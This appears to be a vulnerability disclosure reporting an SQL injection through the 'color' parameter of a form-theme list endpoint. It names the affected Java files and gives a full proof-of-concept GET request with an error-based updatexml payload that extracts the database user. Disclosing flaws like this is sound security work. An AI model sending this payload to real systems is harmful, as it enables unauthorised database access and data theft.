
Currently, only style is processed in the query, and the color field is not processed, so there is an SQL injection vulnerability.
![](https://github.com/ggg48966/123123/blob/main/1735979423849.jpg)
The code with vulnerabilities is located in QueryProThemeRequest.java and FormThemeController.java
![](https://github.com/ggg48966/123123/blob/main/1735979449582.jpg)
![](https://github.com/ggg48966/123123/blob/main/1735979543493.jpg)

POC：
GET /form/theme/list?color=123+or+updatexml(1,concat(0x7e,user(),0x7e),1)='1&style=&timestamp=1731374089028&sign=f92e491d34aa99336288baf5ff4b826b HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: 
Connection: keep-alive

Remediation recommendations：
We recommend that you update your current system or software to the latest version to fix the vulnerability.
